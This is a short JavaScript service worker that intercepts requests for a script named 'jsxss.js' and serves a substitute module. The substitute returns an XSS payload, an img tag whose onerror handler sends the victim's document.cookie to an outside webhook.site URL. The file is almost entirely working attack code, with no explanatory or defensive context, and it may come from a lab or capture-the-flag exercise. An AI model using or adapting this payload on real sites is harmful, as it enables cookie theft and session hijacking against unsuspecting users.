self.addEventListener('install', (e) => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));

self.addEventListener('fetch', (event) => {
  const url = event.request.url;
  if (url === 'http://localhost:3000/jsxss.js' || url.endsWith('/jsxss.js')) {
    const fakeModule = `
      export default function(input) {
        return '<img src=x onerror="new Image().src=\\'https://cb0a3a58-4133-4c5a-ad97-b084579cc6f2.webhook.site?c=\\'+encodeURIComponent(document.cookie)">';
      }
    `;
    event.respondWith(
      new Response(fakeModule, {
        headers: { 'Content-Type': 'application/javascript' }
      })
    );
  }
});